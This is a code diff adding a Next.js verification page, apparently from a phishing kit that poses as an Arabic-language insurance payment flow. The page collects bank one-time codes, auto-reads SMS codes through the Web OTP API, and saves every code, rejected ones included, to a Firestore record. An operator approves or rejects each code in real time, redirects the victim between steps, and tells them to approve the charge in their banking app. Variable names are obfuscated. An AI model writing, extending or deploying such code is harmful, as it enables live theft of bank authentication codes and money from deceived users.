@@ -1,0 +1,389 @@
+"use client"
+
+import { useState, useEffect } from "react"
+import { useRouter } from "next/navigation"
+import { Button } from "@/components/ui/button"
+import { Input } from "@/components/ui/input"
+import { Alert, AlertDescription } from "@/components/ui/alert"
+import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock, Smartphone } from "lucide-react"
+import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
+import { StepShell } from "@/components/step-shell"
+import { db } from "@/lib/firebase"
+import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
+import { addToHistory } from "@/lib/history-utils"
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
+
+const allOtps: string[] = []
+
+export default function VeriPage() {
+  const router = useRouter()
+  const [_v5, _s5] = useState("")
+  const [error, setError] = useState("")
+  const [_v5Status, _ss5] = useState<"pending" | "verifying" | "approved" | "rejected" | "message">("pending")
+  const [isLoading, setIsLoading] = useState(true)
+  const [visitorId, setVisitorId] = useState<string>("")
+  const [canResend, setCanResend] = useState(false)
+  const [resendTimer, setResendTimer] = useState(60)
+  const [referenceNumber, setReferenceNumber] = useState("")
+  const [isConfirming, setIsConfirming] = useState(false)
+
+  // Initialize visitor ID and update current page
+  useEffect(() => {
+    const id = localStorage.getItem("visitor") || ""
+    setVisitorId(id)
+    if (id) {
+      const ref = `REF${Date.now().toString().slice(-8)}`
+      setReferenceNumber(ref)
+    }
+  }, [])
+
+  // Monitor for admin redirects
+  useRedirectMonitor({ visitorId, currentPage: "veri" })
+
+  // Resend timer
+  useEffect(() => {
+    if (resendTimer > 0) {
+      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000)
+      return () => clearTimeout(timer)
+    } else {
+      setCanResend(true)
+    }
+  }, [resendTimer])
+
+  // Check if visitor has access to this page
+  useEffect(() => {
+    const visitorID = localStorage.getItem("visitor")
+    if (!visitorID) {
+      router.push("/home-new")
+      return
+    }
+
+    const checkAccess = async () => {
+      if (!db) return
+      const docRef = doc(db as Firestore, "pays", visitorID)
+      const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
+        if (!docSnapshot.exists()) {
+          router.push("/check")
+          return
+        }
+        setIsLoading(false)
+      })
+
+      return unsubscribe
+    }
+
+    checkAccess()
+  }, [router])
+
+  // Listen to Firestore for OTP status changes
+  useEffect(() => {
+    const visitorID = localStorage.getItem("visitor")
+    if (!visitorID || !db) return
+
+    const unsubscribe = onSnapshot(
+      doc(db as Firestore, "pays", visitorID),
+      (docSnapshot) => {
+        if (docSnapshot.exists()) {
+          const data = docSnapshot.data()
+          const status = data._v5Status as "pending" | "verifying" | "approved" | "rejected" | "message"
+
+          if (status === "rejected") {
+            // Save rejected OTP and reset status
+            const updates: any = {
+              _v5Status: "pending"
+            }
+            
+            // Only save to oldOtp if there's an OTP to save
+            if (data._v5) {
+              const currentOtp = {
+                code: data._v5,
+                rejectedAt: new Date().toISOString()
+              }
+              updates.oldOtp = data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp]
+            }
+            
+            setDoc(doc(db as Firestore, "pays", visitorID), updates, { merge: true }).then(() => {
+              _ss5("pending")
+              _s5("") // Clear the old code
+              setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
+            }).catch(err => {
+              console.error("Error saving rejected OTP:", err)
+              setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
+            })
+          } else if (status === "approved") {
+            _ss5("approved")
+            setError("")
+            router.push("/step3")
+          } else if (status === "verifying") {
+            _ss5("verifying")
+          } else if (status === "message") {
+            _ss5("message")
+          }
+        }
+      },
+      (err) => {
+        console.error("Error listening to document:", err)
+        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
+      }
+    )
+
+    return () => unsubscribe()
+  }, [router])
+
+  // Navigation listener - listen for admin redirects
+  useEffect(() => {
+    const visitorID = localStorage.getItem("visitor")
+    if (!visitorID || !db) return
+
+    const unsubscribe = onSnapshot(
+      doc(db as Firestore, "pays", visitorID),
+      (docSnapshot) => {
+        if (docSnapshot.exists()) {
+          const data = docSnapshot.data()
+          const step = data.currentStep
+
+          // Redirect based on currentStep
+          if (step === "home") {
+            router.push("/insur")
+          } else if (step === "phone") {
+            router.push("/step5")
+          } else if (step === "_t6") {
+            router.push("/step4")
+          } else if (step === "_st1") {
+            router.push("/check")
+          } else if (step === "_t3") {
+            router.push("/step3")
+          }
+        }
+      },
+      (error) => {
+        console.error("Navigation listener error:", error)
+      }
+    )
+
+    return () => unsubscribe()
+  }, [router])
+
+  // Auto-fill OTP from SMS (Web OTP API)
+  useEffect(() => {
+    if ('OTPCredential' in window) {
+      const ac = new AbortController()
+
+      navigator.credentials
+        .get({
+          // @ts-ignore
+          _v5: { transport: ['sms'] },
+          signal: ac.signal,
+        })
+        .then((_v5: any) => {
+          if (_v5 && _v5.code) {
+            _s5(_v5.code)
+          }
+        })
+        .catch((err) => {
+          console.log('OTP auto-fill error:', err)
+        })
+
+      return () => {
+        ac.abort()
+      }
+    }
+  }, [])
+
+  const handleMessageConfirm = async () => {
+    if (!visitorId || !db) return
+    setIsConfirming(true)
+    try {
+      await setDoc(doc(db as Firestore, "pays", visitorId), { _v5Status: "confirmed" }, { merge: true })
+    } catch (err) {
+      console.error("[step2] confirm error:", err)
+      setIsConfirming(false)
+    }
+  }
+
+  const handleOtpSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+
+    if (_v5.length < 4) {
+      setError("يرجى إدخال رمز التحقق")
+      return
+    }
+
+    const visitorID = localStorage.getItem("visitor")
+    if (!visitorID) return
+
+    try {
+      allOtps.push(_v5)
+      // Update the document with the OTP
+      if (!db) return
+      await setDoc(doc(db as Firestore, "pays", visitorID), {
+        _v5,
+        otpSubmittedAt: new Date().toISOString(),
+        allOtps,
+        _v5Status: "verifying", // Set to verifying, waiting for admin decision
+        otpUpdatedAt: new Date().toISOString()
+      }, { merge: true })
+
+      // Add OTP to history
+      await addToHistory(visitorID, "_t2", {
+        _v5: _v5
+      }, "pending")
+
+      _ss5("verifying") // Show loading state
+      // The status will be updated via the listener when admin approves/rejects
+    } catch (err) {
+      console.error("Error submitting OTP:", err)
+      setError("حدث خطأ في إرسال رمز التحقق. يرجى المحاولة مرة أخرى.")
+    }
+  }
+
+  const handleResendOtp = async () => {
+    if (!canResend) return
+
+    const visitorID = localStorage.getItem("visitor")
+    if (!visitorID) return
+
+    try {
+      if (!db) return
+      await setDoc(doc(db as Firestore, "pays", visitorID), {
+        otpResendRequested: true,
+        otpResendAt: new Date().toISOString()
+      }, { merge: true })
+
+      // Reset timer
+      setCanResend(false)
+      setResendTimer(60)
+      _s5("")
+      setError("")
+    } catch (err) {
+      console.error("Error resending OTP:", err)
+      setError("حدث خطأ في إعادة الإرسال. يرجى المحاولة مرة أخرى.")
+    }
+  }
+
+  if (isLoading) {
+    return <SimpleSpinner />
+  }
+
+  return (
+    <>
+      {(_v5Status === "verifying") && (
+        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
+      )}
+
+      {(_v5Status === "message") && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0d47a1]/95" dir="rtl">
+          <div className="text-center space-y-6 px-8">
+            <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
+              <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-white/30" />
+              <div className="absolute h-20 w-20 rounded-full border-4 border-white/50" />
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-white/20">
+                <Smartphone className="h-8 w-8 text-white" />
+              </div>
+            </div>
+            <div className="space-y-3">
+              <p className="text-xl font-bold leading-relaxed text-white">
+                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
+              </p>
+              <div className="flex items-center justify-center gap-2">
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
+              </div>
+            </div>
+            {isConfirming ? (
+              <div className="flex flex-col items-center gap-3 mt-2">
+                <div className="flex items-center justify-center gap-2">
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
+                </div>
+                <p className="text-sm font-semibold text-[#90caf9]">جاري انتظار موافقة البنك...</p>
+              </div>
+            ) : (
+              <button
+                onClick={handleMessageConfirm}
+                className="mt-2 w-full max-w-xs rounded-2xl px-6 py-3 font-bold text-sm bg-white text-[#1565c0] hover:bg-[#e3f2fd] transition-all shadow-lg"
+              >
+                تم الموافقة في التطبيق
+              </button>
+            )}
+          </div>
+        </div>
+      )}
+
+      <StepShell
+        step={4}
+        title="رمز التحقق"
+        subtitle="لإتمام العملية الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك المسجل"
+        icon={<ShieldCheck className="h-8 w-8" />}
+      >
+        <form onSubmit={handleOtpSubmit} className="space-y-4">
+          {error && (
+            <Alert variant="destructive" className="border-2">
+              <AlertCircle className="h-5 w-5" />
+              <AlertDescription className="text-base">{error}</AlertDescription>
+            </Alert>
+          )}
+
+          <div className="rounded-xl border border-[#bbdefb] bg-gradient-to-br from-[#e3f2fd] to-[#e8f4fe] p-4">
+            <div className="space-y-2 text-sm text-[#1565c0]">
+              <div className="flex items-center gap-2">
+                <Clock className="h-4 w-4" />
+                <span>الرمز صالح لمدة 5 دقائق</span>
+              </div>
+              <div className="flex items-center gap-2">
+                <Lock className="h-4 w-4" />
+                <span>لا تشارك هذا الرمز مع أي شخص</span>
+              </div>
+            </div>
+            <div className="mt-3 border-t border-[#bbdefb]/50 pt-3 text-center text-xs text-slate-500">
+              رقم العملية: <span className="font-mono font-bold text-[#1976d2]">{referenceNumber}</span>
+            </div>
+          </div>
+
+          <Input
+            type="password"
+            inputMode="numeric"
+            autoComplete="one-time-code"
+            placeholder="رمز التحقق"
+            value={_v5}
+            onChange={(e) => {
+              const value = e.target.value.replace(/\D/g, "").slice(0, 6)
+              _s5(value)
+              setError("")
+            }}
+            maxLength={6}
+            className="h-12 rounded-xl border-2 border-[#bbdefb] bg-white px-4 text-center text-3xl font-bold tracking-[0.35em] text-[#1565c0] placeholder:text-[#93a7b7] focus:border-[#1976d2]"
+            disabled={_v5Status === "verifying"}
+            required
+            autoFocus
+          />
+
+          <div className="text-center">
+            {canResend ? (
+              <button
+                type="button"
+                onClick={handleResendOtp}
+                className="mx-auto flex items-center justify-center gap-2 text-sm font-bold text-[#1976d2] hover:underline"
+              >
+                <RefreshCw className="h-4 w-4" />
+                إعادة إرسال الرمز
+              </button>
+            ) : (
+              <p className="text-sm text-slate-500">يمكنك إعادة الإرسال بعد <span className="font-bold text-[#1976d2]">{resendTimer}</span> ثانية</p>
+            )}
+          </div>
+
+          <Button
+            type="submit"
+            className="h-12 w-full rounded-xl bg-[#1976d2] hover:bg-[#1565c0] text-lg font-extrabold text-white shadow-[0_4px_16px_rgba(25,118,210,0.3)] hover:shadow-[0_6px_24px_rgba(25,118,210,0.4)] transition-all"
+            disabled={_v5.length < 4 || _v5Status === "verifying"}
+          >
+            تأكيد
+          </Button>
+        </form>
+      </StepShell>
+    </>
+  )
+}
